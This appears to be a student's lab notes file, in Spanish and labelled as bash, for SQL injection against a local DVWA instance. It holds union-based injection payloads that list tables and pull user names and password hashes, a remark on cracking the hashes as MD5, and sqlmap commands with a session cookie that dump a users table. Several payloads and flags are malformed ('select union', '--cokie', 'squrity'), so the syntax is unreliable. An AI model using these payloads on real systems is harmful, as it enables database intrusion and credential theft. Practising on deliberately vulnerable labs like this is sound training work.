#/bin/bash
1 or 1=1 select union 1,table_name from information_schema.tables where table schema != 'mysql'#
#En un supuesto donde con un id te devuelve informacion sobre el usuario se podría
#acceder al nombre de las tablas. En este caso la consulta devuelve dos campos, de 
#ahi poner el uno para que se rellene el primero.
1 or 1=1 select union 1,concat(firstname,0x0a,password) from users #
#Esto devolveria el nombre con las contraseñas en hash simplemente habría que 
#traducir el hash con md5, que es la más habitual
#user: 
mila
#password:
1 or 1=1 union select password from users where user='mila'
#da Forbidden, entrar con 1 and 1=1 tambien, supere la primera pantalla no quiero
#probar con curro que seguramente tenga derecho de administrador y si que tenga permiso
#para tocar sql

#sqlmap 
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Sumit=Submit" --cokie="squrity=low;
PHPSESSID=chl7f8qqpe8ru3dfymlpp54n60*
#Esto nos dara informacion sobre si la pagina tiene algun tipo de vulnerabilidad
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Sumit=Submit" --cokie="squrity=low;
PHPSESSID=chl7f8qqpe8ru3dfymlpp54n60" --current-user
#Para solicitar los usuarios actruales, se podria cambiar por cualquier tipo de consulta
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Sumit=Submit" --cokie="squrity=low;
PHPSESSID=chl7f8qqpe8ru3dfymlpp54n60" -D DataBase -T Users -C users, password, firstname --dump
